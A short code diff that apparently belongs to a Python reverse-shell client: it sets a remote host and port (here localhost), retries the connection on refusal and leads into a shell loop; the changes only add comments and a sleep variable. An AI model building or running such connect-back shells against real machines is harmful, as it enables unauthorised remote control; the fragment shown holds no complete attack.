@@ -7,8 +7,9 @@ import time
 import os
 
 # Variables
-RHOST = "127.0.0.1"
-RPORT = 54321
+RHOST = "127.0.0.1"	#Remote host
+RPORT = 54321		#Remote port
+time_sleep = 1		#Time to try to connect
 
 def reliable_send(data):
 	# If data is bytes
@@ -40,7 +41,7 @@ def init_client():
 			print("Connection Established to Server")
 			return
 		except ConnectionRefusedError:
-			time.sleep(1)
+			time.sleep(time_sleep)
 
 def shell():
 	while True:
